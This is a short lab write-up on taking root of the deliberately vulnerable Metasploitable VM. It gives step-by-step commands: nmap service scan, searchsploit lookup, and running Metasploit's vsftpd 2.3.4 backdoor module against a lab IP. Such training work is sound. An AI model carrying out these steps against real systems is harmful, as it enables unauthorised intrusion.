 ## Metasploitable Writeup ##

 
 **Metasploitable**   is a virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities.
###  Gain root access on this machine:  ###

Login to your kali or any other Linux distribution, in my case I use Kali Linux 

•	Login to the Metasploitable machine 

• Login username and password, in this case, is: ***msfadmin***

  ![2](https://user-images.githubusercontent.com/58820314/107451148-60780980-6b4f-11eb-8a33-ce0c5302154b.png)

•	Check the IP address for this machine by : ***ifconfig***

![1](https://user-images.githubusercontent.com/58820314/107451122-52c28400-6b4f-11eb-9a93-48b02d9ffd6b.png)

•	Now we need to make sure that we can ping on the machine by using this command **ping 192.168.3.130** where the IP of the machine is **192.168.3.130** and here no packet loss which means the connection is successful. 

![3](https://user-images.githubusercontent.com/58820314/107451152-6110a000-6b4f-11eb-942f-2e2e8cfd6c75.png)


•	Next step is to doing scanning for open ports and for service version using nmap and the command : **nmap -sV 192.168.3.130**

![6 ](https://user-images.githubusercontent.com/58820314/107451162-64a42700-6b4f-11eb-8ff9-8352b3068cee.png)

You can test any service here and for me, I used **(vsftpd 2.3.4)**

The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network, vsftpd, which stands for "Very Secure FTP Daemon”, is an FTP server for Unix-like systems, including Linux.

•	In this step we search for vulnerability on this service using this command  **serachsploit vsftpd**

![4](https://user-images.githubusercontent.com/58820314/107451158-62da6380-6b4f-11eb-83a1-641787528b49.png)

Here we found vulnerabilities but we will use a specific one to gain access:  **vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)|unix/remote/17491.rb**

•	Now we need to open the **Metasploit framework** to use this vulnerability but we should start the database using these commands

1.	**sudo msfdb start**

2.	**msfconsole**

![5](https://user-images.githubusercontent.com/58820314/107451159-6372fa00-6b4f-11eb-88e0-e6cf62ae70b0.png)

•	next step is to search for the vsftpd on metaspoloit using this command  **search vsftpd**

![7](https://user-images.githubusercontent.com/58820314/107451166-65d55400-6b4f-11eb-8aa2-e213136ac1a3.png)

•	Here we found the backdoor to gain access which is  **exploit/unix/ftp/vsftpd_234_backdoor**

•	We going to use this backdoor using this command  **use exploit/unix/ftp/vsftpd_234_backdoor**

•	we have to see the options for this backdoor by this command **options** 

•	next step is to identify the **RHOST IP** (the metasploitable IP) by this command **set rhosts 192.168.3.130**

•	the final step is to run our script by this command 

**run**  


